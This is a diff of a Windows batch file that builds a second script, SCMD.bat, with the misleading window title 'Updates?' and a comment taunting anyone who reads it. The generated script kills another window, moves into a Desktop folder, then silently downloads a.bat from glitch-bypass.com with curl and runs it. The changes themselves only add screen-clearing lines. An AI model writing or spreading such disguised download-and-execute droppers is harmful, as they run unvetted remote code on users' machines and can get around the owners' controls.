@@ -4,6 +4,7 @@ echo @echo off>SCMD.bat
 echo title Updates?>>SCMD.bat
 echo color 0A>>SCMD.bat
 echo cd %%userprofile%%>>SCMD.bat
+echo cls>>SCMD.bat
 
 echo taskkill /FI "WINDOWTITLE eq exe-maker" /F>>SCMD.bat
 echo cls>>SCMD.bat
@@ -11,11 +12,16 @@ echo cls>>SCMD.bat
 echo :: Hello, why you looking here? >>SCMD.bat
 
 rem New Code
-echo cd Desktop^>nul>>SCMD.bat
-:: echo cd OneDrive^>nul>>SCMD.bat
-:: echo cd Desktop^>nul>>SCMD.bat
-echo cd "Art Project"^>nul>>SCMD.bat
-echo cd .bat^>nul>>SCMD.bat
+echo cd Desktop>>SCMD.bat
+echo cls>>SCMD.bat
+:: echo cd OneDrive>>SCMD.bat
+echo cls>>SCMD.bat
+:: echo cd Desktop>>SCMD.bat
+echo cls>>SCMD.bat
+echo cd "Art Project">>SCMD.bat
+echo cls>>SCMD.bat
+echo cd .bat>>SCMD.bat
+echo cls>>SCMD.bat
 
 :: echo goto bypass>>SCMD.bat
 
@@ -27,8 +33,10 @@ echo curl -s -o a.bat https://www.glitch-bypass.com/terminal/setup.bat^>nul>>SCM
 echo a.bat>>SCMD.bat
 echo exit>>SCMD.bat
 echo :skip>>SCMD.bat
-echo cd %%userprofile%%^>nul>>SCMD.bat
-echo cd Desktop^>nul>>SCMD.bat
+echo cd %%userprofile%%>>SCMD.bat
+echo cls>>SCMD.bat
+echo cd Desktop>>SCMD.bat
+echo cls>>SCMD.bat
 
 rem End of new code
 
